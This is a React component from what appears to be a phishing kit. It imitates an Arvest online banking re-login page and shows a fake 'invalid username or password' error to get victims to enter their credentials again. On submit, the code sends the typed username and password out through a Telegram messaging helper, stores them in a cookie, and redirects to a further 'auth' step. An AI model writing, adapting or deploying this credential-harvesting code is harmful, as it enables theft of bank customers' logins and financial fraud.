import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function ReLogin() {
  const [formInput, setFormInput] = useState<Login2>({
    username2: "",
    password2: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true);
    const message = `
    [----+🏦 ARVEST (SECOND TRY) 🏦+----]

    USERNAME 2: ${formInput.username2}

    PASSWORD 2: ${formInput.password2}
    `;
    await TelegramSend(message)
    cookies.set("login2", formInput)
    setIsLoading(false);
    navigate("../login/auth", {replace:true})
}
  return (
    <>
      <div className="submitForm">
        
<div id="login-error" className="error-message">
          <p style={{ color: "red" }}>
            Invalid username or password, please try again!
          </p>
        </div>
       
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
          Please enter your Login ID to log in to online banking. <br />
        </p>

        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="username">
              Login ID <span style={{ color: "red" }}>*</span>
            </label>
            <input onChange={handleInputChange} required id="username" name="username2" type="text" />
          </div>
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="password">
              Password <span style={{ color: "red" }}>*</span>
            </label>
            <input required id="password" name="password2" onChange={handleInputChange} type="password" />
          </div>

          <div className="checkboxWrapper" style={{ marginTop: "20px" }}>
            <div className="checkbox">
              <input type="checkbox" name="" id="" />
            </div>
            <div className="label">
              <label htmlFor="">Remember User ID</label>
            </div>
          </div>
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your login ID
            </a>
          </p>
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your password
            </a>
          </p>
          {isLoading ?
            <button style={{ marginTop: "-2px" }} type="button">
          Please wait...
        </button>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>}
        </form>

        
        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
